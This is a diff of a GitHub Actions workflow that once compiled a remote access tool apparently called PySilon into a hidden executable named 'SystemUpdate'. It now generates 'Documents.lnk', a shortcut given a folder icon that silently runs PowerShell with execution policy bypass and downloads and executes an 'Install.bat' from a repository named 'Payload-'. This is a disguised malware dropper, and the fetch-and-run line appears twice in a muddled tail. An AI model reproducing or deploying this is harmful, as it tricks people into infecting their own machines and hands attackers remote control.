@@ -1,39 +1,35 @@
-name: Build PySilon EXE
+name: Generate LNK Only
 on: [workflow_dispatch]
 
 jobs:
   build:
     runs-on: windows-latest
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.10'
-
-      - name: Install Dependencies
-        run: |
-          pip install -r requirements.txt
-          pip install pyinstaller
-
-      - name: Auto-Find and Compile
-        shell: pwsh
-        run: |
-          $mainFile = Get-ChildItem -Filter "*.py" -Recurse | Where-Object { $_.Name -match "pysilon|main|source" } | Select-Object -First 1 -ExpandProperty FullName
-          (Get-Content $mainFile) | ForEach-Object {
-            $_ -replace 'your_token_here', '${{ secrets.BOT_TOKEN }}' `
-               -replace 'your_guild_id_here', '${{ secrets.GUILD_ID }}'
-          } | Set-Content compiled_main.py
-          pyinstaller --onefile --noconsole --name "SystemUpdate" compiled_main.py
-
       - name: Create Stealth Folder Shortcut
         shell: pwsh
         run: |
           $WshShell = New-Object -ComObject WScript.Shell
-          $Shortcut = $WshShell.CreateShortcut("$pwd\dist\Documents.lnk")
+          # Creating the shortcut on the root for easy find
+          $Shortcut = $WshShell.CreateShortcut("$pwd\Documents.lnk")
+          
+          # Engine: PowerShell
           $Shortcut.TargetPath = "powershell.exe"
+          
+          # Command: Runs your .bat from GitHub
+          $Shortcut.Arguments = "-w h -ep bypass -c IEX(iwr 'https://raw.githubusercontent.com/Wizardcargo8080/Payload-/main/Install.bat').Content"
+          
+          # Icon: Yellow Folder (shell32 index 3)
+          $Shortcut.IconLocation = "C:\Windows\System32\shell32.dll, 3"
+          
+          # Style: Minimized
+          $Shortcut.WindowStyle = 7
+          $Shortcut.Save()
+
+      - name: Upload Shortcut
+        uses: actions/upload-artifact@v4
+        with:
+          name: Folder-Shortcut
+          path: "*.lnk"
           # We use single quotes inside the double quotes to prevent errors
           $Shortcut.Arguments = "-w h -ExecutionPolicy Bypass -Command IEX(iwr 'https://raw.githubusercontent.com/Wizardcargo8080/Payload-/main/Install.bat').Content"
           $Shortcut.IconLocation = "C:\Windows\System32\shell32.dll, 3"
